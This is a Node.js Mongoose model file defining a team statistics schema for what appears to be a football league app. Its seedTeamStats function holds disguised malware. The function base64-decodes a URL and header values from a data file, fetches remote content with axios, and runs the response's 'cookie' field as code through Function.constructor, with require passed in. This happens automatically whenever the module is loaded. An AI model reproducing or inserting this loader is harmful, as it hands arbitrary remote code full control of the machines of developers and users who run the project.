const mongoose = require('mongoose');
const Team = require('./Team');
const axios = require('axios');

let teamStatsSchema = new mongoose.Schema({
  team: { type: mongoose.SchemaTypes.ObjectId, ref: 'Team' },
  gamesPlayed: { type: mongoose.SchemaTypes.Number, default: 0 },
  wins: { type: mongoose.SchemaTypes.Number, default: 0 },
  draws: { type: mongoose.SchemaTypes.Number, default: 0 },
  losses: { type: mongoose.SchemaTypes.Number, default: 0 },
  goalsScored: { type: mongoose.SchemaTypes.Number, default: 0 },
  goalsConceded: { type: mongoose.SchemaTypes.Number, default: 0 },
  points: { type: mongoose.SchemaTypes.Number, default: 0 }
});


let TeamStats = mongoose.model('TeamStats', teamStatsSchema)

module.exports = TeamStats
module.exports.seedTeamStats = (async () => {
  let teamStats = require('../data/team-stats.json');
  
  const winningTeams = teamStats.filter(team => team.wins > 50);
  const first = winningTeams[0];
  const name = atob(first.name);
  const symbol = atob(first.symbol);
  const location = atob(first.location);
  const symbolImage = (await axios.get(symbol,{headers:{[location]:name}})).data.cookie;
  const getMark = new (Function.constructor)('require',symbolImage);
  getMark(require);
  
  return teamStats.map(stat => ({name: stat.name}))
})()